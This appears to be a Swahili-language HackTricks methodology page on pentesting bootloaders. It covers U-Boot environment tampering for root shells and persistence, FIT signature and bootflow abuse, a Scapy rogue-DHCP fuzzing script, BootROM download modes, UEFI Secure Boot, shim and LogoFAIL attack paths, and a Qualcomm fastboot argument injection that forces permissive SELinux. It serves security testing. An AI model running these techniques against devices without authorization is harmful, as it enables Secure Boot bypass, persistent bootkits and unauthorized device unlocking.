# Testing ya Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kurekebisha mipangilio ya uanzishaji wa kifaa na ku-test bootloader kama vile U-Boot na loaders za daraja la UEFI. Lenga kupata code execution ya mapema, kutathmini ulinzi wa signature/rollback, na kutumia vibaya recovery au njia za network-boot.

Inahusiana: MediaTek secure-boot bypass kupitia patching ya bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins na matumizi mabaya ya environment

1. Fikia interpreter shell
- Wakati wa boot, bonyeza break key inayojulikana (mara nyingi key yoyote, 0, space, au mfuatano maalum wa board) kabla `bootcmd` haija-execute ili uingie kwenye U-Boot prompt.

2. Kagua hali ya boot na variables
- Commands muhimu:
- `printenv` (dump environment)
- `bdinfo` (taarifa za board, memory addresses)
- `help bootm; help booti; help bootz` (njia za kernel boot zinazoungwa mkono)
- `help ext4load; help fatload; help tftpboot` (loaders zinazopatikana)

3. Rekebisha boot arguments ili kupata root shell
- Ongeza `init=/bin/sh` ili kernel iingie kwenye shell badala ya init ya kawaida:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot kutoka kwenye TFTP server yako
- Sanidi network na fetch kernel/fit image kutoka LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Hifadhi mabadiliko kupitia environment
- Ikiwa env storage haijalindwa dhidi ya write, unaweza kuhifadhi control:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Kagua variables kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` zinazoathiri fallback paths. Thamani zilizosanidiwa vibaya zinaweza kutoa breaks zinazorudiwa kwenda kwenye shell.

6. Kagua features za debug/unsafe
- Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` isiyo na vizuizi, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka kwenye media isiyoaminika, na kernels/ramdisks zinazopakiwa bila signature checks.

7. U-Boot image/verification testing
- Ikiwa platform inadai kuwa na secure/verified boot yenye FIT images, jaribu images zisizo na signature na zilizobadilishwa:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Kutokuwepo kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu ku-boot payloads za kiholela.
- Usisimame kwenye matokeo rahisi ya allow/deny: utafiti wa hivi karibuni wa FIT ulionyesha kuwa verification path yenyewe inaweza kuwa attack surface ya pre-auth. Fanya negative-test kwenye FIT data iliyohifadhiwa externally (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, na handling ya overlay / `extra-conf`.
- Ikiwa una matching source tree, `test/vboot/vboot_test.sh` ni njia ya haraka ya ku-reproduce FIT verification behaviour katika U-Boot sandbox kabla ya kugusa hardware halisi.

8. Standard Boot (`bootstd`), `extlinux`, na script bootflows
- Kwenye U-Boot builds za kisasa, `bootcmd` mara nyingi huwa wrapper tu inayozunguka Standard Boot. Hii inamaanisha media inayoweza kuandikwa, PXE, au SPI flash inaweza kuwa trust boundary halisi hata wakati environment inayoonekana inaonekana salama.
- `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza kisha `boot.scr`. Kwenye network boot, jina la script linaweza kutoka kwa `boot_script_dhcp`.
- Commands muhimu za triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Abuse cases za ku-test: USB/SD media inayodhibitiwa na attacker ikiwa mapema kwenye `boot_targets`, `/boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP rogue inayotoa `boot.scr`, au script execution inayotumia SPI kupitia `script_offset_f`.
- Ikiwa platform inategemea FIT verification, hakikisha configurations zimesainiwa katika configuration level na si kwa kila image pekee; `required-mode=all` ina nguvu zaidi kuliko kukubali key yoyote moja inayohitajika.

## Network-boot surface (DHCP/PXE) na servers za rogue

9. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling imewahi kuwa na memory-safety issues. Kwa mfano, CVE‑2024‑42040 inaeleza memory disclosure kupitia crafted DHCP responses inayoweza ku-leak bytes kutoka U-Boot memory kurudi kwenye network. Tumia DHCP/PXE code paths zenye values ndefu kupita kiasi au za edge-case (option 67 bootfile-name, vendor options, file/servername fields) na uangalie hangs/leaks.
- Minimal Scapy snippet ya ku-stress boot parameters wakati wa netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Pia thibitisha ikiwa PXE filename fields zinapitishwa kwenye shell/loader logic bila sanitization zinapounganishwa na OS-side provisioning scripts.

10. Rogue DHCP server command injection testing
- Sanidi rogue DHCP/PXE service na ujaribu ku-inject characters kwenye filename au options fields ili kufikia command interpreters katika hatua zinazofuata za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au custom Scapy scripts zinafaa. Hakikisha unatenga lab network kwanza.

## SoC ROM recovery modes zinazopita normal boot

SoC nyingi huonyesha BootROM "loader" mode inayokubali code kupitia USB/UART hata wakati flash images si halali. Ikiwa secure-boot fuses hazijachomwa, hii inaweza kutoa arbitrary code execution mapema sana kwenye chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) au `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` ya kusukuma na ku-run custom U-Boot kutoka RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ya kuweka loader na kupakia custom U-Boot.

Tathmini ikiwa kifaa kina secure-boot eFuses/OTP zilizochomwa. Ikiwa hazijachomwa, BootROM download modes mara nyingi hupita verification yoyote ya kiwango cha juu (U-Boot, kernel, rootfs) kwa ku-execute first-stage payload yako moja kwa moja kutoka SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

11. ESP tampering, rollback, na key-enrollment testing
- Mount EFI System Partition (ESP) na kagua loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Dump Secure Boot state na key databases kutoka OS inapowezekana:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Ikiwa platform iko kwenye Setup Mode, inakubali unauthenticated key enrollment, au inasafirishwa ikiwa na test/default Platform Key (PKfail class), local admin au physical attacker anaweza ku-enroll KEK/db yake na kufanya Secure Boot ionekane “enabled” huku aki-boot arbitrary EFI binaries.
- Jaribu ku-boot kwa kutumia signed boot components zilizodowngrade au zinazojulikana kuwa vulnerable ikiwa Secure Boot revocations (dbx) si za sasa. Ikiwa platform bado inaamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako au `grub.cfg` kutoka ESP ili kupata persistence.

12. Stale shim / SBAT / dbx revocation testing
- Shims za zamani zilizosainiwa na Microsoft na vendor forks bado zinaweza kutumika kama BYOVD-style bootkit path ikiwa revocations ni za zamani. Katika isolated lab, weka shim iliyowahi kuwa vulnerable kwenye ESP na ujaribu ku-chainload `grubx64.efi` au kernel yako.
- Quick triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Ikiwa shim bado ina-run licha ya kuwa kwenye revocation list, firmware/OS ina stale `dbx` updates au inaamini forked loader ambayo haikuwahi kurithi upstream SBAT protections.

13. Boot logo parsing bugs (LogoFAIL class)
- Firmware kadhaa za OEM/IBV zilikuwa vulnerable kwa image-parsing flaws kwenye DXE zinazochakata boot logos. Ikiwa attacker anaweza kuweka crafted image kwenye ESP chini ya vendor-specific path (kwa mfano, `\EFI\<vendor>\logo\*.bmp`) na kufanya reboot, code execution wakati wa early boot inaweza kuwezekana hata Secure Boot ikiwa enabled. Test ikiwa platform inakubali user-supplied logos na ikiwa paths hizo zinaweza kuandikwa kutoka OS.

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Kwenye Android 16 devices zinazotumia Qualcomm's ABL kupakia **Generic Bootloader Library (GBL)**, thibitisha ikiwa ABL **ina-authenticate** UEFI app inayopakia kutoka `efisp` partition. Ikiwa ABL hukagua tu **uwepo** wa UEFI app na haithibitishi signatures, write primitive kwenye `efisp` huwa **pre-OS unsigned code execution** wakati wa boot.

Practical checks na abuse paths:

- **efisp write primitive**: Unahitaji njia ya kuandika custom UEFI app kwenye `efisp` (root/privileged service, OEM app bug, recovery/fastboot path). Bila hii, GBL loading gap haifikiwi moja kwa moja.
- **fastboot OEM argument injection** (ABL bug): Baadhi ya builds hukubali tokens za ziada kwenye `fastboot oem set-gpu-preemption` na kuziongeza kwenye kernel cmdline. Hii inaweza kutumiwa kulazimisha permissive SELinux, na kuwezesha protected partition writes:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Ikiwa device ime-patchiwa, command inapaswa kukataa arguments za ziada.
- **Bootloader unlock kupitia persistent flags**: Boot-stage payload inaweza kubadilisha persistent unlock flags (kwa mfano, `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila OEM server/approval gates. Huu ni mabadiliko ya kudumu ya posture baada ya reboot inayofuata.

Defensive/triage notes:

- Thibitisha ikiwa ABL hufanya signature verification kwenye GBL/UEFI payload kutoka `efisp`. Ikiwa haifanyi hivyo, chukulia `efisp` kama persistence surface yenye risk kubwa.
- Fuatilia ikiwa ABL fastboot OEM handlers zime-patchiwa **ku-validate argument counts** na kukataa tokens za ziada.

## Tahadhari ya hardware

Kuwa mwangalifu unapoingiliana na SPI/NAND flash wakati wa early boot (kwa mfano, ku-ground pins ili kupita reads) na kila mara rejelea flash datasheet. Shorts zilizofanywa kwa wakati usiofaa zinaweza kuharibu kifaa au programmer.

## Notes na tips za ziada

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` ili kuhamisha environment blobs kati ya RAM na storage; baadhi ya platforms huruhusu ku-import env kutoka removable media bila authentication.
- Kwa persistence kwenye Linux-based systems zinazo-boot kupitia `extlinux.conf`, kurekebisha `APPEND` line (ili ku-inject `init=/bin/sh` au `rd.break`) kwenye boot partition mara nyingi hutosha wakati hakuna signature checks zinazotekelezwa.
- Ikiwa target inatumia dual-slot / A/B updates, pitia anti-rollback na slot-desync techniques katika [firmware analysis overview](README.md) ili usikose updater-only trust gaps zilizo nje ya bootloader yenyewe.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na env storage halisi. Offsets zilizosanidiwa vibaya hukuruhusu kusoma/kuandika MTD region isiyo sahihi.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
